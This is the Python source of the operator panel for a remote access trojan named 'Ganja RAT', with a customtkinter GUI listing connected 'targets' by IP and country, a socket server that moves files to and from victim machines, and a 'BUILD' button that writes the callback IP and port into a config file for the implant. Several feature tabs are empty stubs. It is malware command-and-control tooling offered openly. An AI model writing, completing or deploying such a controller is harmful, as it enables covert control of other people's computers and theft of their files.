import customtkinter as ctk
import socket
import pygame
import os
import threading
from tkinter import messagebox

HOST, PORT = '127.0.0.1', 5552

pygame.init()
pygame.mixer.init()

class Server:
    def __init__(self, host, port, gui, comm):
        self.host = host 
        self.port = port  
        self.gui = gui  
        self.comm = comm  
        self.clients = []  
        self.running = False  

    def start_server(self):
        self.running = True
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((self.host, self.port))
                server_socket.listen(10)
                print(f"[+] Сервер запущен на {self.host}:{self.port}")

                while self.running:
                    conn, addr = server_socket.accept()
                    print(f"[+] Новое подключение {addr}")

                    client_info = {"conn": conn, "addr": addr, "ip": addr[0], "port": addr[1], "country": "Unknown"}
                    self.clients.append(client_info)

                    self.gui.after(0, self.gui.create_users_app, self.clients)

                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                    client_thread.start()
        
                    sound = pygame.mixer.Sound('plus.mp3')
                    sound.play()
        except Exception as e:
            print(f"[-] Ошибка сервера: {e}")
        finally:
            self.running = False

    def stop_server(self):
        self.running = False
        print("[+] Сервер остановлен.")

    def handle_client(self, conn, addr):
        ip, port = addr
        try:
            with conn:
                while self.running:
                    command = conn.recv(1024).decode('utf-8').strip()
                    if not command:
                        break  

                    print(f"[+] Команда от {addr}: {command}")

                    self.process_command(command, conn, addr)
        except (ConnectionError, socket.error) as e:
            print(f"[-] Клиент {addr} отключился: {e}")
        finally:
            print(f"[-] Подключение с {addr} закрыто")
            self.remove_client(addr)

    def process_command(self, command, conn, addr):
        if command.startswith("download"):
            self.download_file(conn)
        elif command.startswith("upload"):
            filename = command.split(" ")[1]
            self.send_file(filename, conn)
        elif command == "exit":
            conn.send(b"exit")
        else:
            conn.send(b"UNKNOWN COMMAND")

    def send_file(self, filename, conn):
        try:
            if os.path.exists(filename):
                file_size = os.path.getsize(filename)
                header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
                conn.send(header.ljust(1024))

                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(24576)
                        if not data:
                            break
                        conn.send(data)
                print(f"[+] Файл {filename} отправлен.")
            else:
                conn.send(b"FILE_NOT_FOUND")
                print(f"[-] Файл {filename} не найден.")
        except Exception as e:
            print(f"[-] Ошибка при отправке файла: {e}")

    def download_file(self, conn):
        try:
            header = conn.recv(1024).decode('utf-8').strip()
            if header.startswith("FILE"):
                parts = header.split()
                file_size = int(parts[1])
                filename = parts[2]

                with open(filename, 'wb') as file:
                    received = 0
                    while received < file_size:
                        data = conn.recv(24576)
                        if not data:
                            break
                        file.write(data)
                        received += len(data)
                print(f"[+] Файл {filename} успешно загружен.")
            else:
                print("[-] Ошибка при загрузке файла: неверный заголовок.")
        except Exception as e:
            print(f"[-] Ошибка при загрузке файла: {e}")

    def remove_client(self, addr):
        ip, port = addr
        print(f"Удаление клиента: {ip}:{port}")
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                self.clients.remove(client)
                break
        self.gui.after(0, self.gui.create_users_app, self.clients)


class GanjaRATApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Ganja RAT")
        self.geometry("1000x500")
        self.resizable(False, True)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("green")

        self.users = []
        self.user_frames = []

        self.comm = CommandFunction()
        self.server = Server(HOST, PORT, self, self.comm)

        server_thread = threading.Thread(target=self.server.start_server, daemon=True)
        server_thread.start()

        self.create_app()

    def create_app(self):
        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='green')
        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='Ganja RAT - made by GBW!', text_color='black', font=('Bold', 30))
        self.gbw_frame.pack(side='top', fill='x')
        self.gbw_title.pack(side='left', pady=10)

        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#000000')
        self.menu.pack(side='top', fill='x')

        self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
        self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
        self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
        self.builder_btn = ctk.CTkButton(self.menu, height=10, text='BUILD', text_color='red', font=('Bold', 15), fg_color='black', command=self.draw_config_app)
        self.text_ip.pack(side='left', padx=75)
        self.text_port.pack(side='left', padx=75)
        self.text_contry.pack(side='left', padx=75)
        self.builder_btn.pack(side='right', padx=15)

    def create_user(self, ip, port, country):
        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='green', corner_radius=10)
        user_ground.pack(side='top', padx=10, pady=5, fill='x')

        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="white", font=('Bold', 15))
        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="white", font=('Bold', 15))
        user_ip.pack(side='left', padx=50)
        user_port.pack(side='left', padx=50)
        user_contry.pack(side='left', padx=50)

        select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port))
        select_func_button.pack(side='right', pady=5, padx=5)

        self.user_frames.append(user_ground)

    def clear_users(self):
        for frame in self.user_frames:
            frame.destroy()
        self.user_frames.clear()

    def create_users_app(self, users: list):
        self.clear_users() 
        for user in users:
            self.create_user(user["ip"], user["port"], user["country"])

    def draw_config_app(self):
        self.config_app = ConfigApp(self) 
        self.config_app.grab_set() 

    def draw_func_app(self, ip, port):
        func_app = FunctionApp(ip, port)
        threading.Thread(target=func_app.mainloop())


class ConfigApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Build Config")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_app()

    def create_app(self):
        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
        self.login_frame.pack(side='top', pady=40, padx=20, fill="both", expand=True)

        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
        self.login_title.pack(side='top', pady=10)

        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
        self.entry_ip.pack(pady=10, padx=20)

        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
        self.entry_port.pack(pady=10, padx=20)

        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
        self.btn.pack()

    def build_info_file(self, ip, port):
        config_info_list = [f'{ip}\n', f'{port}\n']
        try:
            with open('playit.txt', 'w', encoding='utf-8') as file:
                file.writelines(config_info_list)
            return True
        except Exception:
            return False

    def remove_frame(self):
        ip = self.entry_ip.get()
        port = self.entry_port.get()
        build = self.build_info_file(ip, port)
        if build:
            messagebox.showinfo('Ganja RAT', 'Config file has been build, drop this to main file')
        else:
            messagebox.showerror('Ganja RAT', 'Build config file has been not complete! Error')
        
        self.destroy()


class FunctionApp(ctk.CTk):
    def __init__(self, ip, port):
        super().__init__()

        self.ip = ip
        self.port = port

        self.title("Function")
        self.geometry("600x500")
        
        self.comm = CommandFunction()

        self.create_func_app()
    
    def create_func_app(self):
        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='green')
        self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='black', font=('Bold', 25))
        self.gbw_func_frame.pack(side='top', fill='x')
        self.gbw_func_title.pack(side='top', pady=10)

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(side='top', fill='both', expand=True)

        self.tabview.add("Function")
        self.tabview.add("Fun")
        self.tabview.add("System")
        self.tabview.add("Files")
        self.tabview.add("Info")

        self.add_content_to_tabs()

    def add_content_to_tabs(self):
        self.func_tab = self.tabview.tab("Function")
        self.ping_btn = ctk.CTkButton(self.func_tab, text='PING', command=self.comm.ping, font=('Bold', 15))
        self.ping_btn.pack(side='left', pady=10, padx=10)
        
        self.fun_tab = self.tabview.tab("Fun")
        

        self.sys_tab = self.tabview.tab("System")
        

        self.file_tab = self.tabview.tab("Files")
        

        self.info_tab = self.tabview.tab("Info")
        

    def show_tab(self, tab_name):
        self.tabview.set(tab_name)

    def page_func(self):
        pass

    def page_fun(self):
        pass

    def page_sys(self):
        pass

    def page_file(self):
        pass

    def page_info(self):
        pass


class CommandFunction():
    def send_msg(self, msg):
        messagebox.showinfo('Ganja rat', msg)

    def ping(self):
        pass

if __name__ == "__main__":
    app = GanjaRATApp()
    app.mainloop()